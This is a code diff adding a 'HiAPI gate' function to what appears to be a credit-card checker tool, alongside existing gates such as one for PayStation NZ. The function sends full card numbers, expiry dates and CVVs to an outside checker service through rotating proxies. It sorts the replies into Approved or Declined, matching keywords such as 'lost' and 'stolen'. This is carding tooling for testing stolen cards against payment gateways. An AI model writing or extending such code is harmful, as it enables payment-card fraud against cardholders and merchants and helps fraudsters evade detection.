@@ -572,6 +572,46 @@ def test_proxy_connectivity(proxy_str):
     return False, 0, last_error
 
 
+def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
+    """HiAPI gate — uses ck.hiapi.club checker endpoints."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+
+    try:
+        # Build proxy param for the API
+        proxy_param = ""
+        if proxies:
+            # Extract raw proxy string from dict
+            for scheme in ("https", "http", "socks5", "socks4"):
+                if scheme in proxies:
+                    raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
+                    proxy_param = raw
+                    break
+
+        url = f"https://ck.hiapi.club/api/{endpoint}"
+        params = {"c": cc_data}
+        if proxy_param:
+            params["p"] = proxy_param
+
+        resp = requests.get(url, params=params, timeout=30)
+        process_time = round(time.time() - start_time, 2)
+
+        if resp.status_code == 200:
+            text_resp = resp.text.strip()
+            text_lower = text_resp.lower()
+
+            if any(k in text_lower for k in ("approved", "success", "live", "charged", "authenticate")):
+                return f"Approved | {text_resp[:120]} ({process_time}s)"
+            elif any(k in text_lower for k in ("declined", "deny", "fail", "insufficient", "expired", "invalid", "do not honor", "lost", "stolen", "restricted", "pickup")):
+                return f"Declined | {text_resp[:120]} ({process_time}s)"
+            else:
+                return f"Unknown | {text_resp[:120]} ({process_time}s)"
+        else:
+            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
     """STC gate — PayStation NZ payment gateway auth."""
     start_time = time.time()
